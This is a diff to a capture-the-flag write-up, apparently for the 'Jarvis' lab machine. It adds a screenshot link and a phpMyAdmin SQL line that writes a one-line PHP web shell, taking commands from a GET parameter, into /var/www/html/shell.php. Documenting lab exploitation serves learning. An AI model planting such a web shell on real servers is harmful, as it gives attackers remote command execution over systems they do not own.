@@ -129,6 +129,7 @@ ________________________________________________________________________________
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/phpmyadmin.png)
 
 #### This code will create one archive with the name "shell.php" inside the directory "/var/www/html"
+#### ``SELECT "<?php system($_GET['Dark0']); ?>" into outfile "/var/www/html/shell.php"``   
    
-   
+![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2005-04-04.png)   
 
